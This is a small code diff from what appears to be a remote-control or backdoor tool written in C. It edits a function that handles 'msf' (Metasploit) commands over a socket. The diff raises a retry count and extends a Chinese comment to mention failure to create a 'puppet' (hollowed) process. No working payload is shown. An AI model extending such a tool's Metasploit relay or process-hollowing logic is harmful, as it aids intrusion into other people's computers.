@@ -300,8 +300,8 @@ BOOL MSF(SOCKET sServer, char cmd[])
 	if (_strnicmp(cmd, "msf ", 4) != 0)
 		return FALSE;
 
-	// 错误msf格式 或者 msf连接失败
-	for (int i = 0; i < 8; i++)
+	// 错误msf格式 或者 msf连接失败 或者 傀儡进程创建失败
+	for (int i = 0; i < 12; i++)
 	{
 		if (IsRecvError(sServer))
 		{
